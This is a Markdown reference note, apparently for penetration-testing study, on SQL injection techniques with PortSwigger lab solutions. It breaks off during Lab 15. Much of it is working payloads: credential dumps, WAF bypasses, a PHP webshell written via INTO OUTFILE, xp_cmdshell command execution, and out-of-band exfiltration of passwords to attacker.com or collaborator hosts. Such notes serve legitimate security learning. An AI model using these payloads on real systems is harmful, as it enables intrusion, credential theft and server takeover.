---
title: "SQL Injection"
type: technique
tags: [auth-bypass, database, exploitation, injection, sqli, waf-bypass, web]
phase: exploitation
date_created: 2026-05-12
date_updated: 2026-07-14
sources: [cpts-sqli-fundamentals, ps-labs-sqli, thm-adv-sqli-advanced, thm-linux-sql, thm-web-sql-fundamentals, h1-scraped-sqli, thm-adv-orm, payloadsallthethings-sqli, git-payloadsallthethings, git-portswigger-all-labs, cve-2026-9082-drupal]
---

## What it is

SQL Injection (SQLi) is a code injection technique that allows an attacker to interfere with the queries an application makes to its database. It is the most prevalent and impactful web vulnerability class, enabling data exfiltration, authentication bypass, file system access, and in some configurations, OS command execution.

See also: [[sqlmap]], [[authentication-attacks]], [[business-logic]], [[nosql-injection]]

---

## How it works

Applications construct SQL queries dynamically by concatenating user-supplied input directly into query strings. When input is not properly sanitised or parameterised, an attacker can inject SQL syntax that alters the query's logic, structure, or intent.

```sql
-- Vulnerable construction
SELECT * FROM users WHERE username = '$input';

-- Injected: input = ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1';
```

The server executes the modified query and returns results based on the injected logic.

---

## Prerequisites

- An injectable parameter: URL query string, POST body, cookie, HTTP header (User-Agent, X-Forwarded-For, Referer), or JSON/XML field
- Knowledge of DBMS type (MySQL, MSSQL, PostgreSQL, Oracle, SQLite) — fingerprint from error messages, response timing, or banner
- For UNION attacks: number of columns in the original query
- For file operations: FILE privilege (MySQL), `xp_cmdshell` enabled (MSSQL), or equivalent

---

## Methodology

### Detection

Probe each parameter with characters that break SQL syntax and observe response differences:

```
'          -- single quote: syntax error
''         -- escaped quote: no error (confirms string context)
`          -- backtick (MySQL)
")         -- closes string + parenthesis
-- -       -- SQL comment (MySQL, MSSQL)
#          -- SQL comment (MySQL)
/**/       -- block comment
```

**Error-based fingerprint by DBMS:**

| DBMS | Error signature |
|------|----------------|
| MySQL | `You have an error in your SQL syntax` |
| MSSQL | `Unclosed quotation mark after the character string` |
| PostgreSQL | `ERROR: unterminated quoted string` |
| Oracle | `ORA-01756: quoted string not properly terminated` |
| SQLite | `unrecognized token` |

**Keyword-based fingerprint by DBMS:**

| DBMS | Query snippet |
|------|----------------|
| MySQL | `conv('a',16,2)=conv('a',16,2)` |
| MSSQL | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
| PostgreSQL | `5::int=5` or `pg_client_encoding()=pg_client_encoding()` |
| Oracle | `ROWNUM=ROWNUM` |
| SQLite | `sqlite_version()=sqlite_version()` |

---

### In-Band: UNION-Based Extraction

**Step 1 — Determine column count:**

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    -- increment until error; column count = last working N
```

Alternative using NULL:
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

**Step 2 — Find printable (string) columns:**

Replace each NULL with a string literal until visible output changes:
```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
```

**Step 3 — Extract data:**

```sql
-- Current DB, user, version (MySQL/MSSQL)
' UNION SELECT database(),user(),version()-- -

-- List all tables in current DB (non-Oracle)
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -

-- List columns in a table (non-Oracle)
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Dump credentials
' UNION SELECT username,password,NULL FROM users-- -

-- Concatenate multiple columns into one (MySQL)
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users-- -

-- PostgreSQL: concatenate into single column
' UNION SELECT NULL,username||'-'||password FROM users--

-- PostgreSQL / MySQL / MSSQL version
' UNION SELECT NULL,version()--         -- PostgreSQL
' UNION SELECT NULL,@@version--          -- MySQL / MSSQL
```

**Oracle-specific enumeration:**

```sql
-- Oracle requires FROM clause in every SELECT; use DUAL for constants
' UNION SELECT NULL,banner FROM v$version--
' UNION SELECT 'a','b' FROM dual--

-- List all tables (Oracle)
' UNION SELECT NULL,table_name FROM all_tables--

-- List columns in a table (Oracle)
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_XWRQEE'--

-- Dump credentials (Oracle)
' UNION SELECT USERNAME_COL,PASSWORD_COL FROM USERS_TABLE--
```

**Concatenation syntax by DBMS:**

| DBMS | Syntax | Notes |
|------|--------|-------|
| MSSQL | `'foo'+'bar'` | `+` operator |
| PostgreSQL | `'foo'||'bar'` | `\|\|` operator |
| MySQL | `'foo' 'bar'` or `CONCAT('foo','bar')` | space or CONCAT |
| Oracle | `'foo'||'bar'` | `\|\|` operator |

---

### In-Band: Error-Based Extraction

Forces the DBMS to embed query results in the error message. Works when application reflects error output.

**MySQL — extractvalue:**
```sql
' AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
' AND extractvalue(1, concat(0x7e, (SELECT database())))-- -
' AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
```

**MySQL — updatexml:**
```sql
' AND updatexml(1, concat(0x7e,(SELECT version())),1)-- -
```

**MSSQL — convert error:**
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
```

**PostgreSQL — CAST type mismatch (visible error-based):**

When the application reflects database error messages, casting string data to `int` forces the value into the error output. Clear the TrackingId value to free character budget, then add `LIMIT 1` to avoid multi-row errors:

```sql
-- Confirm boolean CAST works
' AND 1=CAST((SELECT 1) AS int)--

-- Extract username via error message
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-- Error: invalid input syntax for type integer: "administrator"

-- Extract password via error message
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- Error: invalid input syntax for type integer: "92xxhtubhmgxhsyhhldk"
```

**Oracle — conditional divide-by-zero (error-based blind):**

Used when the application returns different HTTP status codes on SQL errors vs. normal execution:

```sql
-- Confirm DUAL works; true condition triggers error
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
-- → 500 error (division by zero)

'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
-- → 200 OK (false branch returns empty string)

-- Confirm table exists
'||(SELECT '' FROM users WHERE ROWNUM=1)||'

-- Confirm user exists
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- Enumerate password length
'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- Extract password char by char (Burp Intruder Cluster Bomb: position + charset)
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

---

### Blind: Boolean-Based

No data in response — infer values from binary true/false response differences (content length, element presence, redirect).

**Condition template:**
```sql
' AND 1=1-- -    -- true condition: normal response
' AND 1=2-- -    -- false condition: altered response

-- Extract DB name character by character
' AND SUBSTRING(database(),1,1)='a'-- -
' AND ASCII(SUBSTRING(database(),1,1))>100-- -
' AND ASCII(SUBSTRING(database(),1,1))=109-- -
```

**Check if admin user exists:**
```sql
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1-- -
```

**Cookie / header injection pattern (TrackingId):**

Many apps embed SQLi in cookie values rather than URL parameters. The approach is identical but the payload goes in the `Cookie:` header:

```sql
-- Confirm boolean true (response shows "Welcome back!" or similar indicator)
Cookie: TrackingId=xyz'+AND+'1'='1

-- Confirm boolean false (indicator absent)
Cookie: TrackingId=xyz'+AND+'1'='0

-- Check admin exists via subquery
Cookie: TrackingId=xyz'+AND+(SELECT 'a' FROM users WHERE username='administrator')='a

-- Determine password length
Cookie: TrackingId=xyz'+AND+(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a

-- Extract password character by character (Burp Intruder Sniper, positions 1–20, charset a-z0-9)
Cookie: TrackingId=xyz'+AND+SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

---

### Blind: Time-Based

No response difference — infer values from server response delay.

```sql
-- MySQL
' AND SLEEP(5)-- -
' AND IF(1=1, SLEEP(5), 0)-- -
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL (semicolon variant)
'; SELECT pg_sleep(5)-- -
'; SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')=1 THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- PostgreSQL (string-concatenation variant — works in cookie/string contexts)
'||pg_sleep(10)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -

-- SQLite
' AND randomblob(500000000/1)-- -
```

**PostgreSQL time-based full enumeration workflow (cookie injection):**

```sql
-- Step 1: Confirm vulnerability
Cookie: TrackingId=x'||pg_sleep(10)--

-- Step 2: Confirm true vs false with CASE
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
'||(SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--

-- Step 3: Confirm users table exists
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--

-- Step 4: Confirm administrator user
'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--

-- Step 5: Enumerate password length (Intruder Sniper, FUZZ = 1..30)
'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)=FUZZ) THEN pg_sleep(20) ELSE pg_sleep(-1) END FROM users)--

-- Step 6: Extract password char by char (Intruder Cluster Bomb: position 1-20 + charset a-z0-9)
'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

---

### Out-of-Band (OOB)

Exfiltrates data via a side channel (DNS, HTTP). Requires network egress from the DB server.

**MySQL — DNS via LOAD_FILE:**
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\share'))-- -
```

**MSSQL — DNS via xp_dirtree:**
```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'-- -
```

**Oracle — HTTP via UTL_HTTP:**
```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual-- -
```

**Oracle — DNS via EXTRACTVALUE + XXE (Burp Collaborator):**

Trigger DNS/HTTP interaction to Burp Collaborator or similar OOB receiver:

```sql
-- Trigger OOB interaction (confirm vulnerability)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

URL-encoded form (for cookie/header injection):
```
'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual--
```

**Oracle — DNS data exfiltration (full password in one request):**

Embed query result directly in the DNS subdomain so the collaborator receives it as part of the lookup:

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

URL-encoded payload for cookie injection:
```
'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.BURP-COLLABORATOR.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

**Oracle — OOB char-by-char enumeration (when full exfil is blocked):**

```sql
' UNION SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))='a')
  THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual)
  ELSE NULL END FROM dual--
```

Use Burp Intruder Battering Ram with character set a-z0-9 at each position; a collaborator interaction confirms the matching character.

---

### File Read / Write

**MySQL read:**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL-- -
```

**MySQL write (webshell):**
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```

Requires: `FILE` privilege, `secure_file_priv` set to empty or target directory.

---

### OS Command Execution

**MSSQL — xp_cmdshell:**
```sql
'; EXEC master..xp_cmdshell 'id'-- -
-- Enable if disabled:
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -
```

**MySQL — UDF:** Write a UDF `.so`/`.dll` to the plugin directory and create the function. Typically automated via `sqlmap --os-shell`.

---

### Authentication Bypass

```sql
admin'-- -          -- comment out password check
admin'#             -- MySQL comment variant
' OR '1'='1         -- always-true condition
' OR 1=1-- -
' OR 'x'='x
') OR ('1'='1       -- closes additional parenthesis
' OR 1=1 LIMIT 1-- -
```

**Raw MD5 and SHA1 bypass:**
When PHP uses `md5($password, true)` or `sha1($password, true)`, it returns raw binary. If the raw binary contains characters that form a valid SQL injection (like `'or'`), authentication can be bypassed.
- MD5: `ffifdyop` produces `'or'6]!r,b` (evaluates to `'or'`)
- MD5: `129581926211651571912466741651878684928` produces `ÚT0DŸ o#ßÁ'or'8` (evaluates to `'or'`)
- SHA1: `178374` produces `™ÜÛ¾}_i™›a!8Wm'/*´Õ` (evaluates to `'/*`)

**Hashed Passwords bypass (UNION):**
If the application retrieves a password hash from the DB and locally compares it with the hash of the provided password, an attacker can use UNION to supply a known hash:
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
```
Supplying `P@ssw0rd` as the login password will match the injected MD5 hash (`161ebd7d45089b3446ee4e0d86dbcf92`).

---

### WAF Bypass Techniques

**Comment obfuscation:**
```sql
UN/**/ION SEL/**/ECT
/*!UNION*/ /*!SELECT*/      -- MySQL versioned comments
```

**Case variation:**
```sql
uNiOn SeLeCt
```

**URL encoding:**
```sql
%27 OR %271%27%3D%271       -- ' OR '1'='1
%55NION %53ELECT            -- U → %55, S → %53
```

**Double URL encoding:**
```sql
%2527   -- %25 decoded to %, then %27 decoded to '
```

**Whitespace substitution:**
```sql
UNION%09SELECT   -- tab
UNION%0ASELECT   -- newline
UNION(SELECT     -- no space before parenthesis
```

**HTTP parameter pollution:**
```
id=1&id=2 UNION SELECT 1,2,3-- -
```

**XML encoding bypass (Hackvertor `hex_entities`):**

When an endpoint accepts XML payloads (e.g., stock check POST body) and a WAF blocks standard SQL keywords, encode the payload with XML hex entities. The DB processes the decoded value after the WAF passes it:

1. In Burp Repeater, send the standard payload in the XML body — receive `403 Attack detected`.
2. Install the **Hackvertor** Burp extension.
3. Wrap the injection in `<@hex_entities>...</@hex_entities>` tags.
4. Burp encodes each character as `&#xNN;` before sending; the XML parser decodes it; the WAF never sees plaintext SQL keywords.

```sql
-- Underlying payload (1 column returned in this context)
1 UNION SELECT NULL--

-- After Hackvertor hex_entities encoding, sent in XML field:
-- &#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;...
```

Credential extraction in single-column XML context:
```sql
1 UNION SELECT username||'~'||password FROM users--
-- Returns: administrator~<password>
```

---

### Second-Order Injection

Payload stored safely on first request, retrieved and used unsafely in a subsequent query.

1. Register username: `admin'-- -` (stored as `admin''-- -`)
2. Application later constructs: `UPDATE users SET password='x' WHERE username='admin'-- -'`
3. Comment truncates the WHERE clause — updates admin's password unconditionally

**Test every quote context, on every page that reflects the value.** The first-order input
(login/register) is frequently parameterized while the *same stored value* is concatenated
unsafely on another page (profile, dashboard, "last logins"). A `'` that does nothing at login
can simply be the wrong delimiter — the second-order sink may use **double quotes**
(`WHERE x = "$v"`); always also test `"`, `` ` ``, and numeric/no-quote. And confirm on the page
that *renders* the value (in-band error/UNION) before falling back to blind on a page that
reflects nothing. Workflow: register username = `"`, log in, load the page that shows it; a
reflected `SQLSTATE ... near '"""'` proves a double-quote second-order sink. (Pure time-based on
the login page can also be a dead end when an anti-bruteforce `SLEEP()` adds a constant delay
that masks your injected `SLEEP`.)

#### Capturing plaintext creds from PROCESSLIST (hashed-in-query antipattern)

When an app hashes the password *inside* the SQL (`... WHERE user="admin" AND pass=md5("PLAINTEXT")`)
instead of in code, the **plaintext lives in the running query** in `information_schema.PROCESSLIST`.
If a bot/admin authenticates periodically — and a slow anti-bruteforce `SLEEP()` holds the query a
few seconds — read it through the SQLi (the app connects as the same DB user, so you see its threads
even without the global `PROCESS` privilege):

```sql
" UNION SELECT 1,SUBSTRING((SELECT info FROM information_schema.PROCESSLIST
  WHERE id=(SELECT MIN(id) FROM information_schema.PROCESSLIST)),<pos>,16)-- -
```

- `INFO` is non-NULL only while the thread is *running* — poll fast, timed to the bot's login.
- Output truncates to the sink column's display width (e.g. 16 chars for a datetime column).
  Register one account per N-char window (`<pos>` = 1,17,33,…), log each in, then hammer the page
  with all sessions during the bot's window and concatenate the blocks into the full query.
- Error-based variant (`extractvalue`/`updatexml`) yields ~32 chars per error.
- Extracted creds are frequently **reused for SSH**, not the web login.

Ref: THM "Rabbit Hole" / sqlinception. The MD5 visible in the `users` table is a decoy
(intentionally uncrackable); the real password exists only inside the live query.

---

### Advanced / Niche Injection Types

**Stacked Queries**
Executing multiple statements separated by a delimiter (`;`).
```sql
1; EXEC xp_cmdshell('whoami') --
```

**Polyglot Injection**
Crafted payload that successfully executes in multiple contexts (e.g. string, integer, missing parenthesis).
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

**Routed Injection**
The output of an injectable query feeds into a second query that produces the output. Usually performed via hex encoding.
```sql
-- 0x2720756e696f6e2073656c65637420312c3223 is hex for: ' union select 1,2#
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

**PDO Prepared Statements**
In PHP <= 8.3 with MySQL, user input directly concatenated into a PDO statement (e.g. `SELECT $input...`) can be injected by smuggling `?` or `:` along with null bytes.
```sql
-- Injecting: ?#\0
GET /index.php?col=%3f%23%00&name=anything
```

---

## Remediation (for context during testing)

- Parameterised queries / prepared statements — the only reliable fix
- Input validation — allowlist expected characters; blocklist alone is insufficient
- Principle of least privilege — DB user should not have FILE, EXECUTE, or admin rights
- WAF is not a fix; treat as speed bump only

---

## ORM Leaks
An ORM leak vulnerability occurs when sensitive information is unintentionally exposed due to improper handling of ORM queries or when attackers can manipulate filters to infer data (e.g., using relational filtering).

### Django ORM Filter Injection
When endpoints pass kwargs directly into `.filter(**request.data)`, attackers can use Django's field lookup operators.
```json
{
  "username": "admin",
  "password__startswith": "p"
}
```
**Relational Filtering (One-to-One / Many-to-Many):**
You can walk relationships to leak passwords from linked objects:
```json
{"created_by__departments__employees__user__password__startswith": "p"}
```

**ReDoS Error-Based Leaking:**
In some backends (like MySQL), a complex regex match `__regex` that fails to match will return normally, but a backtracking explosion causes a 500 timeout. This can be used as a boolean oracle.

### Prisma (Node.JS)
When user input dictates the `where` clause in Prisma queries:
```json
{
  "filter": {
    "createdBy": {
      "resetToken": {
        "startsWith": "a"
      }
    }
  }
}
```
Tools like `elttam/plormber` can automate ORM Leak time-based vulnerabilities in Prisma and Django.

## Payload reference (PayloadsAllTheThings)

Distinctive payloads from PAT that complement the techniques above with WAF bypass variants and auth-bypass edge cases not covered elsewhere.

### WAF bypass — whitespace and operator substitution

```sql
-- Whitespace alternatives (bypass space-sensitive WAFs)
UNION%09SELECT   -- horizontal tab
UNION%0ASELECT   -- newline
UNION(SELECT     -- no space needed before parenthesis

-- Operator substitution
AND -> &&
OR  -> ||
=   -> LIKE
=   -> REGEXP

-- Case variation
uNiOn SeLeCt
```

### WAF bypass — MySQL versioned comments

```sql
/*!UNION*/ /*!SELECT*/ 1,2,3--
UN/**/ION SEL/**/ECT 1,2,3--
```

### Raw hash authentication bypass

```sql
-- MD5 raw bytes bypass (PHP md5($pass, true))
-- ffifdyop → raw MD5 contains 'or'6...]' which evaluates as SQL
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
-- Supply password P@ssw0rd to match injected MD5 hash
```

### Polyglot injection (multi-context)

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed injection (hex-encoded subquery)

```sql
-- 0x2720756e696f6e2073656c65637420312c3223 = ' union select 1,2#
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

---

## Database Fingerprinting — Version Queries

| DBMS | Version query | Notes |
|------|--------------|-------|
| MySQL | `' UNION SELECT NULL,@@version--` | Same syntax as MSSQL |
| MSSQL | `' UNION SELECT NULL,@@version--` | Same syntax as MySQL |
| PostgreSQL | `' UNION SELECT NULL,version()--` | Function call |
| Oracle | `' UNION SELECT NULL,banner FROM v$version--` | Requires FROM; use DUAL fallback: `SELECT version FROM v$instance` |

Comment syntax reminder:

| DBMS | Comment | Notes |
|------|---------|-------|
| Oracle | `--` | All SELECT need FROM; use DUAL |
| MSSQL | `--` | Stacked queries supported |
| PostgreSQL | `--` | Stacked queries supported |
| MySQL | `-- -` or `#` | Must have space after `--`; `#` is also valid |

---

## PortSwigger Labs

All 18 PortSwigger Web Security Academy SQLi labs, grouped by difficulty.

### Apprentice

#### Lab 1 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
**Technique:** Basic WHERE clause bypass

```sql
-- Show all products including unreleased (comment out AND released=1)
GET /filter?category=Gifts'--

-- Show all products across all categories
GET /filter?category=Gifts'+OR+1=1--
-- Query becomes: SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

URL-encode the payload before forwarding in Burp Repeater (`Ctrl+U`).

---

#### Lab 2 — SQL injection vulnerability allowing login bypass
**Technique:** Authentication bypass via comment

```sql
-- Comment out the password check (submit as username)
administrator'--

-- Alternative: make password condition always true
-- In password field:
'+or'1'='1
-- Query becomes: SELECT * FROM users WHERE username='administrator' AND password='' OR '1'='1
```

---

### Practitioner

#### Lab 3 — SQL injection attack, querying the database type and version on Oracle
**Technique:** UNION-based version fingerprint on Oracle

```sql
-- Determine column count (ORDER BY 3 errors → 2 columns)
GET /filter?category=Gifts'+ORDER+BY+3--

-- Both columns are string type (DUAL required in Oracle)
GET /filter?category=Gifts'+UNION+SELECT+'a','b'+FROM+dual--

-- Extract Oracle version
GET /filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
-- Alternatives: SELECT banner FROM v$version | SELECT version FROM v$instance
```

---

#### Lab 4 — SQL injection attack, querying the database type and version on MySQL and Microsoft
**Technique:** UNION-based version fingerprint on MySQL/MSSQL

```sql
-- Determine column count (UNION NULL until no 500 error)
' UNION SELECT NULL,NULL--

-- Extract version (same syntax for MySQL and MSSQL)
' UNION SELECT NULL,@@version--
```

---

#### Lab 5 — SQL injection attack, listing the database contents on non-Oracle databases
**Technique:** information_schema enumeration (MySQL/PostgreSQL/MSSQL)

```sql
-- List tables
GET /filter?category=Gifts'+union+all+select+'1',TABLE_NAME+from+information_schema.tables--

-- List columns in discovered table (e.g. users_vptjgu)
GET /filter?category=Gifts'+union+all+select+'1',COLUMN_NAME+from+information_schema.columns+WHERE+table_name='users_vptjgu'--

-- Dump credentials (columns: username_lvfons, password_femvin)
GET /filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--
```

Note: Table and column names are randomised per lab instance. Discover them first from information_schema.

---

#### Lab 6 — SQL injection attack, listing the database contents on Oracle
**Technique:** all_tables / all_tab_columns enumeration on Oracle

```sql
-- List tables (Oracle uses all_tables, not information_schema)
GET /filter?category=Pets'+union+all+select+'1',table_name+from+all_tables--
-- Interesting table: USERS_XWRQEE

-- List columns in target table
GET /filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name='USERS_XWRQEE'--
-- Columns: USERNAME_KIWRQE, PASSWORD_OCABHB

-- Dump credentials
GET /filter?category=Pets'+union+all+select+USERNAME_KIWRQE,PASSWORD_OCABHB+from+USERS_XWRQEE--
```

---

#### Lab 7 — SQL injection UNION attack, determining the number of columns returned by the query
**Technique:** Column count enumeration via ORDER BY and UNION NULL

```sql
-- ORDER BY method: increment until error
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- error → 3 columns total? Or adjust per response
' ORDER BY 4--   -- if this errors, query returns 3 columns

-- UNION NULL method: add NULLs until 200 OK
' UNION SELECT NULL,NULL,NULL--
-- or with literals:
/filter?category=Accessories'+union+all+select+'0','1','2'--
```

---

#### Lab 8 — SQL injection UNION attack, finding a column containing text
**Technique:** Identify text-compatible columns

```sql
-- With 3 columns confirmed, probe each position for string type
' UNION SELECT NULL,NULL,NULL--                   -- baseline
' UNION SELECT 'a',NULL,NULL--                    -- test col 1
' UNION SELECT NULL,'Qrc0Pq',NULL--               -- test col 2 (success if value appears in response)
' UNION SELECT NULL,NULL,'a'--                    -- test col 3
```

The column that reflects the injected string back in the page accepts text data.

---

#### Lab 9 — SQL injection UNION attack, retrieving data from other tables
**Technique:** UNION extraction from a named table

```sql
-- 2 columns, both string type
' UNION SELECT username,password FROM users--
-- Returns all username:password pairs from users table
```

---

#### Lab 10 — SQL injection UNION attack, retrieving multiple values in a single column
**Technique:** Concatenation to collapse multiple columns into one

```sql
-- Only 1 column accepts strings; concatenate with separator
-- PostgreSQL
' UNION SELECT NULL,username||'-'||password FROM users--

-- MySQL
' UNION SELECT NULL,CONCAT(username,'-',password) FROM users--

-- MSSQL
' UNION SELECT NULL,username+'-'+password FROM users--

-- Oracle
' UNION SELECT NULL,username||'-'||password FROM users--
```

---

#### Lab 11 — Blind SQL injection with conditional responses
**Technique:** Boolean-based blind via cookie TrackingId, character-by-character brute-force

```
-- True condition: "Welcome back!" appears
Cookie: TrackingId=xyz'+AND+'1'='1

-- False condition: message absent
Cookie: TrackingId=xyz'+AND+'1'='0

-- Confirm administrator exists
Cookie: TrackingId=xyz'+AND+(SELECT 'a' FROM users WHERE username='administrator')='a

-- Determine password length (Intruder Sniper, numbers 1-50)
Cookie: TrackingId=xyz'+AND+(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a

-- Extract password char by char (Intruder Sniper: position fixed, charset a-z0-9)
Cookie: TrackingId=xyz'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a
```

Automate with Burp Intruder: Sniper, Payload type=Simple list (a-z0-9), grep "Welcome back!" as success condition. Repeat for each of the 20 positions.

---

#### Lab 12 — Blind SQL injection with conditional errors
**Technique:** Oracle error-based blind via conditional divide-by-zero in TrackingId cookie

```sql
-- Confirm string injection context (two quotes = valid escape)
Cookie: TrackingId=xyz''

-- Confirm Oracle (DUAL required; bare SELECT fails)
Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'

-- Confirm users table exists (ROWNUM=1 prevents multi-row error)
Cookie: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'

-- Confirm administrator user exists (error = true, 200 = false)
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- Enumerate password length (Intruder Sniper, N = 1-21; error means LENGTH > N)
Cookie: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- Extract password (Intruder Cluster Bomb: pos 1-20 + charset a-z0-9; 500=match)
Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

---

#### Lab 13 — Visible error-based SQL injection
**Technique:** PostgreSQL CAST type error leaks data into error message

```sql
-- Confirm error reflection (single quote reveals query structure)
Cookie: TrackingId=xyz'

-- Confirm boolean CAST
Cookie: TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--

-- Extract username (clear TrackingId value to stay within char limit)
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-- Error: invalid input syntax for type integer: "administrator"

-- Extract password
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- Error: invalid input syntax for type integer: "<password>"
```

Key insight: remove the original TrackingId value to free up character budget when the query has a length limit.

---

#### Lab 14 — Blind SQL injection with time delays
**Technique:** Confirm PostgreSQL time-based injection via `||pg_sleep()`

```sql
Cookie: TrackingId=x'||pg_sleep(10)--
-- 10-second response delay confirms vulnerability
```

---

#### Lab 15 — Blind SQL injection with time delays and information retrieval
**Technique:** PostgreSQL time-based blind full enumeration

```sql
-- Confirm with conditional
Cookie: TrackingId=x'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--

-- Enumerate password length (Intruder Sniper, FUZZ=1..30; response time spike = match)
Cookie: TrackingId=x'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)=FUZZ) THEN pg_sleep(20) ELSE pg_sleep(-1) END FROM users)--

-- Extract password char by char (Intruder Cluster Bomb: pos 1-20, charset a-z0-9)
